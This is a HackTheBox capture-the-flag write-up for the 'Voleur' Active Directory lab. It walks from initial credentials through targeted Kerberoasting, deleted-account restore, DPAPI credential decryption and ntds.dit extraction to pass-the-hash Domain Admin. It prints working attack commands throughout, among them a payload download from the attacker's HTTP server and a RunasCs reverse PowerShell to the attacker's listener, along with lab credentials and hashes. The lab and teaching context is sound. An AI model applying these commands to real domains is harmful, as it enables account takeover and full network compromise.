---
layout: post
title: "HTB Voleur — Full Write-up"
date: 2026-07-18
categories: [htb, active-directory]
tags: [kerberos, dpapi, kerberoasting, wsl]
description: >-
  An Active Directory lab: targeted Kerberoasting, pivoting with RunasCs, a deleted account brought back to life, and DPAPI vaults, all the way to Domain Admin via pass-the-hash.
image:
  path: /assets/img/voleur/00-voleur-preview.png
  alt: HTB Voleur preview
---
**Target:** `10.129.232.130` (DC.voleur.htb) **Domain:** `voleur.htb` **Difficulty:** Medium (Active Directory)

Voleur is the kind of box that drives home one important thing about AD: **the attack rarely comes from a single big vulnerability**. What we have here is a long chain of small credentials, each one unlocking the next, like a set of keys that open one another. Let's walk the whole chain, step by step.

---

## 1. Initial recon

First step, as always: a full port scan with version detection and default scripts.

```bash
sudo nmap -sCV -vv -oA nmap/voleur 10.129.232.130
```

### What we find

|Port|Service|Notes|
|---|---|---|
|53|DNS|Simple DNS Plus — classic for a DC|
|88|Kerberos|Confirms the Domain Controller role|
|135|MSRPC|—|
|139 / 445|NetBIOS / SMB|The main enumeration vector|
|389 / 3268|LDAP / Global Catalog|Domain: `voleur.htb`|
|464|kpasswd5|Kerberos password changes|
|593|RPC over HTTP|—|
|636 / 3269|LDAPS / GC SSL|—|
|**2222**|**SSH (OpenSSH 8.2, Ubuntu)**|Unusual on a Windows DC — a sign there's a Linux component somewhere in the infrastructure. Keep it in mind for later.|
|5985|WinRM|This will become our shell vector|

Two details from the scan that matter a lot later on:

- **Clock skew of ~8 hours.** Kerberos is paranoid about time — the default tolerance is only 5 minutes. If your local clock differs too much from the DC, any Kerberos authentication dies with `KRB_AP_ERR_SKEW`, no matter how correct the credentials are.
- **SMB signing enabled and required.** That kills any idea of a classic NTLM relay right off the bat. The message is basically: "you work clean here, with Kerberos, or you don't work at all."

> **Analogy:** think of Kerberos as a concert ticket with an expiry time printed on it. If your clock shows the wrong time, the doorman (the KDC) looks at the ticket, sees that it "expired in the past" or "was issued in the future", and turns you away — even if the ticket is 100% genuine.

---

## 2. Preparing the Kerberos environment

### 2.1 Generating `krb5.conf`

NetExec can generate the Kerberos config file automatically, based on the information it identifies over SMB:

```bash
nxc smb DC.voleur.htb --generate-krb5-file voleur.htb
sudo cp voleur.htb /etc/krb5.conf
```

Without this file being correct (realm, KDC, domain mapping), Kerberos authentication from the attack machine is guaranteed to fail, even if the password is right.

### 2.2 Syncing the clock

```bash
sudo ntpdate 10.129.232.130
```

**Golden rule:** sync the clock _before_ any Kerberos authentication. It's probably the single most common cause of failure in AD labs — people have the right password, but Kerberos rejects them anyway because of the time.

---

## 3. Validating the initial credentials

We start with a valid set of credentials: `ryan.naylor` / `HollowOct31Nyt`.

```bash
nxc smb DC.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k
```

The result confirms `signing:True`, `SMBv1:None`, `NTLM:False` — a strict environment, but Kerberos authentication (`-k`) works without issue.

---

## 4. Enumerating SMB shares

```bash
nxc smb DC.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --shares
```

|Share|Access (ryan.naylor)|Notes|
|---|---|---|
|ADMIN$ / C$|—|Standard|
|Finance / HR|no access|Revisit with other credentials|
|IPC$|READ|Standard|
|**IT**|**READ**|Our starting point|
|NETLOGON / SYSVOL|READ|Standard|

> **Methodology lesson:** any READ access on a share with a "business" name (here `IT`) is the first place you look for config files, internal documents or — jackpot — Excel files with "temporary" passwords.

---

## 5. BloodHound collection

We collect the AD graph data as early as possible, the moment we have any valid account:

```bash
bloodhound-python -u 'ryan.naylor' -d 'voleur.htb' -p 'HollowOct31Nyt' -c all --zip -ns 10.129.232.130 --dns-tcp
sudo neo4j console
```

Then we open BloodHound and import the archive.

> **Why it matters:** BloodHound doesn't hand you exploits, it hands you the _map_. ACL relationships, group memberships, active sessions, delegations — all the things you'd discover manually anyway, but much slower. Here, for example, it shows us that `ryan.naylor` has Kerberos Pre-Authentication disabled — the door left wide open for an **AS-REP Roast**.

---

## 6. Exploring the IT share

```bash
smbclient --realm=voleur.htb -U 'voleur.htb/ryan.naylor%HollowOct31Nyt' //DC.voleur.htb/IT
```

In the `First-Line Support` folder we find:

```
smb: \First-Line Support\> ls
  Access_Review.xlsx    A    16896   Thu Jan 30 09:14:25 2025

smb: \First-Line Support\> get Access_Review.xlsx
```

> **Methodology lesson:** Excel files with generic names ("Access Review", "Onboarding", "Passwords") are golden targets in IT shares. Companies keep account/password lists "just temporarily, for a few days" — which stay there for months.

---

## 7. Cracking the Excel password

The file is password-protected. We extract the John the Ripper-compatible hash:

```bash
office2john Access_Review.xlsx > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

**Result:** the password falls almost instantly — `football1`.

> **Why it went so fast:** Office 2013 uses SHA1/SHA512 with 100,000 iterations, which means a decent computational cost per attempt. But the cryptographic protection is only as strong as the password the user picked — and `football1` is exactly the kind of password sitting in the top rows of rockyou.txt. A Swiss vault with a "1234" combination is still a weak vault.

---

## 8. What's inside the Excel file

Accounts, groups and operational notes.

|Account|Group / Role|Note|
|---|---|---|
|**ryan.naylor**|SMB|Kerberos Pre-Auth temporarily disabled (legacy system testing) → **AS-REP Roasting**|
|marie.bryant|SMB|—|
|lacey.miller|Remote Management Users|WinRM access|
|**todd.wolfe**|Remote Management Users|"Leaver" account — password reset to `NightT1meP1dg3on14`, due to be deleted|
|jeremy.combs|Remote Management Users|Access to the "Software" folder|
|Administrator|Domain Admin|"Not for daily tasks" — the final target|
|svc_backup|Windows Backup|"Talk to Jeremy Combs"|
|**svc_ldap**|LDAP Services|Exposed password: `M1XyC9pW7qT5Vn`|
|**svc_iis**|IIS Administration|Exposed password: `N5pXyW1VqM7CZ8`|
|svc_winrm|Remote Management|Password recently reset by Lacey Miller — not listed directly|

We immediately validate the two exposed passwords:

```bash
nxc smb DC.voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k
nxc smb DC.voleur.htb -u svc_iis -p 'N5pXyW1VqM7CZ8' -k
```

Both work.

---

## 9. From `svc_ldap` to `svc_winrm`: targeted Kerberoasting

In BloodHound we notice two essential things:

1. `svc_ldap` is a member of the **Restore Member User** group (relevant later, for Todd's account).
2. `svc_ldap` has **WriteSPN** over the `svc_winrm` account, and `svc_winrm` is a member of the **Remote Management Users** group (i.e. it has WinRM access).

This is a classic abuse combination: if you can write a Service Principal Name (SPN) onto an account that otherwise doesn't have one, you can force that account to become "kerberoastable" — you basically hang a "service" tag on it so you can request a service ticket for it.

> **Analogy:** normal kerberoasting works for "service" accounts (e.g. an account running a website), because anyone in the domain can request a service ticket to that service — and the ticket is encrypted with the account's password hash. If an account does _not_ have an SPN, you can't request that ticket. WriteSPN is like being able to stick a "Public Service" tag on a colleague's office door yourself, even though they don't work a counter — and suddenly anyone can request a ticket to them, which you can attack offline.

We add a fake SPN on `svc_winrm`, using `svc_ldap`'s right:

```bash
bloodyad -d voleur.htb --host dc.voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k \
  set object svc_winrm servicePrincipalName -v 'HTTP/CeAvemNoiAici'
```

Now we request the service ticket (kerberoasting) for `svc_winrm`:

```bash
nxc ldap DC.voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' --kerberoast - -k
```

We get a `$krb5tgs$23$...` hash — a TGS ticket encrypted with the NTLM hash of `svc_winrm`'s password. We save it and attack it offline with hashcat:

```bash
hashcat -m 13100 -a 0 krbt_hash /usr/share/wordlists/rockyou.txt
```

**Password found:** `AFireInsidedeOzarctica980219afi`

Confirm:

```bash
nxc ldap DC.voleur.htb -u svc_winrm -p 'AFireInsidedeOzarctica980219afi' -k
```

---

## 10. WinRM access as `svc_winrm`

We cracked the password through kerberoasting, so we stay inside the Kerberos ecosystem: instead of authenticating directly with user + password (NTLM), we get a clean TGT for the account and use it directly, without pushing the password over the network on every connection.

```bash
getTGT.py 'voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi'
```

`getTGT.py` (from Impacket) does the step `kinit` would normally do: it asks the KDC (the DC) for a **Ticket Granting Ticket (TGT)** for `svc_winrm`, using user + password just once.

> **Analogy:** think of the KDC as the front desk of an amusement park. You show your ID (user + password) once at the entrance and get a **general-access wristband** (the TGT), valid for a few hours. From then on, at each ride (each service — SMB, LDAP, WinRM) you don't show your ID anymore, you show the wristband, and the system hands you specific tickets (TGSs) without checking you from scratch.

The command saves the result to a `svc_winrm.ccache` file — the wristband saved to disk, essentially, in the standard Kerberos ticket cache format. We use it with `evil-winrm`:

```bash
KRB5CCNAME=svc_winrm.ccache evil-winrm -i dc.voleur.htb -r voleur.htb
```

`KRB5CCNAME` is a standard Kerberos environment variable that tells the program: *"when you need tickets, don't request them again — look in this file"*. So `evil-winrm` reads the TGT from `svc_winrm.ccache`, automatically requests a TGS for the WinRM service on `dc.voleur.htb`, and authentication happens entirely through Kerberos — without sending the password again. The `-r voleur.htb` flag specifies the Kerberos realm needed for the TGS request, and `-i dc.voleur.htb` is the target address.

We're in. **User flag found:**

```
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> cat user.txt
fxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb0
```

---

## 11. Pivoting to `svc_ldap` with RunasCs

We want to run commands as `svc_ldap` from the current context. We stage `RunasCs.exe` locally:

```bash
sudo cp /opt/tools/SharpCollection/NetFramework_4.5_Any/_RunasCs.exe .
mv _RunasCs.exe runascs.exe
```

We spin up a local HTTP server to transfer it to the target:

```bash
python3 -m http.server 8000
```

From the evil-winrm session, we download the binary:

```powershell
wget http://10.10.15.43:8000/runascs.exe -o runascs.exe
```

We start a local listener:

```bash
nc -lnvp 9001
```

We're authenticated as `svc_winrm`, but the rights we care about next belong to `svc_ldap` — a member of the **Restore Member User** group, needed below to recover Todd's account. Simply knowing the password doesn't help if we run PowerShell commands under `svc_winrm`'s token: the AD cmdlets (`Get-ADObject`, `Restore-ADObject`) inherit the permissions of the _current session user_, not of an account whose credentials we merely "know". So we need to actually change the process identity, not just authenticate remotely as `svc_ldap` over LDAP.

This is where `RunasCs.exe` comes in — an open-source alternative to the classic `runas.exe` that works perfectly from a non-interactive shell (like our reverse shell from evil-winrm). It uses `CreateProcessWithLogonW` to start a new process, fully authenticated in the domain as another user, unlike the standard `runas.exe`, which needs an interactive desktop and often only does local authentication (`/netonly`) without getting you a real domain token.

And we run the command for a reverse shell as `svc_ldap`:

```powershell
.\runascs.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r 10.10.15.43:9001
```

The result is a new `powershell.exe`, started with `svc_ldap`'s credentials, connecting back to us on port 9001 — a separate shell in which every command runs with `svc_ldap`'s real rights.

---

## 12. Recovering Todd Wolfe's deleted account

Remember from the Excel file: `todd.wolfe` was a "leaver" account — employee gone, account marked for deletion, but with its password reset to `NightT1meP1dg3on14` beforehand. Because `svc_ldap` is a member of the **Restore Member User** group, we can bring the account back from the AD Recycle Bin.

We search for deleted objects:

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
```

We find:

```
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
Name              : Todd Wolfe
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
```

We restore it:

```powershell
Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
```

> **Analogy:** Active Directory doesn't delete an object instantly — it moves it to a kind of Recycle Bin where it sits for a while before permanent deletion (the tombstone lifetime). If you have the right permission, you can pull the object back out of the Recycle Bin exactly like recovering a file you accidentally deleted from your desktop, as long as you haven't emptied the Recycle Bin.

We confirm that `todd.wolfe` / `NightT1meP1dg3on14` works and re-run BloodHound collection with the new context:

```bash
bloodhound-python -u 'todd.wolfe' -d 'voleur.htb' -p 'NightT1meP1dg3on14' -c all --zip -ns 10.129.232.130 --dns-tcp
```

---

## 13. DPAPI files — decrypting Todd's vault

We check the shares accessible as Todd:

```bash
smbclient --realm=voleur.htb -U 'voleur.htb/todd.wolfe%NightT1meP1dg3on14' //DC.voleur.htb/IT
```

Then we do a full spider across all shares to find interesting files:

```bash
nxc smb DC.voleur.htb -u todd.wolfe -p 'NightT1meP1dg3on14' -M spider_plus -k -o EXCLUDE_FILTER='print$,ipc$,SYSVOL,NETLOGON'
```

We find a classic DPAPI folder in Todd's archived profile:

```
smb: \Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-...-1110\> ls
 08949382-134f-4c63-b93c-ce52efc0aa88      A      740
 BK-VOLEUR                                AHS      900
 Preferred                                AHS       24
```

> **DPAPI analogy:** think of DPAPI as a vault with two different keys, either of which can open it. One is the user's key — derived from their Windows password. The other is the company's backup key (the domain backup key), held by the DC, for when a user forgets their password. The file we just found is a masterkey — the vault itself, encrypted. If we have the user's password, we can open the vault exactly like the legitimate owner.

We decrypt the masterkey using Todd's password:

```bash
impacket-dpapi masterkey \
  -file 08949382-134f-4c63-b93c-ce52efc0aa88 \
  -sid S-1-5-21-3927696377-1337352550-2781715495-1110 \
  -password NightT1meP1dg3on14
```

We get the decrypted key. With it, we decrypt a credential file found in the same place:

```bash
impacket-dpapi credential -file DFBE70A7E5CC19A398EBF1B96859CE5D \
  -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

This turns out to be a Windows Live credential, of no interest to us. But we find a second credential file in the same folder, and decrypting that one is what counts:

```bash
impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 \
  -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

Result — Jeremy Combs's password, saved by Todd as an "emergency" credential:

```
Target      : Domain:target=Jezzas_Account
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

---

## 14. `jeremy.combs` — the SSH key and the move to Linux

We connect as Jeremy and explore his dedicated folder:

```bash
smbclient --realm=voleur.htb -U 'voleur.htb/jeremy.combs%qT3V9pLXyN7W4m' //DC.voleur.htb/IT
```

```
smb: \Third-Line Support\> ls
 id_rsa                              A     2602
 Note.txt.txt                        A      186
```

We download `id_rsa`. Decoding the contents (the file is stored base64) tells us who the key belongs to: `svc_backup@DC`. This is where that unusual SSH port from recon (**2222**) makes itself felt — the machine's Linux component.

---

## 15. AD backups over SSH — the final jackpot

We connect over SSH on the non-standard port, using the private key we found. First we give it the correct permissions (SSH refuses private keys with permissions that are too open):

```bash
chmod 600 id_rsa
ssh -i id_rsa -p 2222 svc_backup@10.129.232.130
```

We're in. Here the mystery of port 2222 from recon is cleared up: we're not dealing with a separate Linux machine, but with **WSL (Windows Subsystem for Linux)** running directly on the DC. We confirm quickly:

```bash
svc_backup@voleur:~$ uname -a
svc_backup@voleur:~$ ls /mnt/c
```

`/mnt/c` shows us the Windows `C:\` drive mounted directly in the Linux filesystem — a clear sign of WSL.

> **Analogy:** think of WSL as a hotel room inside the same building (the Windows host running everything) — the room has its own keypad-locked door (port 2222, SSH), its own keys (Linux users separate from the Windows ones). But there's a quirk: from the room you have free access to a shared hotel storage where all the other guests' things are kept (/mnt/c = the Windows C: drive, with everything on it).
> In practice, anyone who gets the room key (SSH access to WSL) doesn't stay stuck in there — they can step out into the hallway and roam freely through the shared storage, i.e. through the entire hosted Windows system.

With this access, we explore the mounted Windows filesystem, looking for anything resembling a backup:

```bash
svc_backup@voleur:~$ find /mnt/c -iname "*backup*" 2>/dev/null
```

We find exactly what we were after:

```
/mnt/c/IT/Third-Line Support/Backups
```

We check the contents quickly:

```bash
svc_backup@voleur:~$ ls -la "/mnt/c/IT/Third-Line Support/Backups"
```

```
ntds.dit
ntds.jfm
SECURITY
SYSTEM
```

The filenames are a clear signal: a full backup of the Active Directory database, exactly what we need for the final step. We download the entire folder locally:

```bash
scp -i id_rsa -P 2222 -r svc_backup@10.129.232.130:"/mnt/c/IT/Third-Line Support/Backups" .
```


> **Analogy:** `ntds.dit` is basically the domain's "ledger" — it holds the password hashes of every account in AD. The `SYSTEM` and `SECURITY` files are the keys that unlock that ledger (without them, the hashes in ntds.dit are encrypted and useless). If you have all three, you effectively have access to the passwords/hashes of every account in the domain — including Administrator.

We extract everything with `secretsdump`:

```bash
sudo impacket-secretsdump \
  -system "/home/vasilesco/Backups/registry/SYSTEM" \
  -security "/home/vasilesco/Backups/registry/SECURITY" \
  -ntds "/home/vasilesco/Backups/Active Directory/ntds.dit" \
  LOCAL
```

Among the results, the Administrator's NTLM hash:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
```

---

## 16. Domain Admin — Pass-the-Hash

With the Administrator's NTLM hash we don't need the cleartext password. We use `psexec` with Pass-the-Hash:

```bash
impacket-psexec -hashes :e656e07c56d831611b577b160b259ad2 -k "voleur.htb/administrator@dc.voleur.htb"
```

> **Pass-the-Hash analogy:** if NTLM were a combination lock, the hash is the equivalent of a perfect copy of the key — you don't need the original combination (the cleartext password), because the lock accepts any object whose shape matches its key exactly. The NTLM protocol checks the hash, not the password itself, so a copy of the hash opens the door just as well as the original.

Shell obtained as `NT AUTHORITY\SYSTEM` on the DC. **Root flag:**

```
C:\Users\Administrator\Desktop> type root.txt
2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx0
```
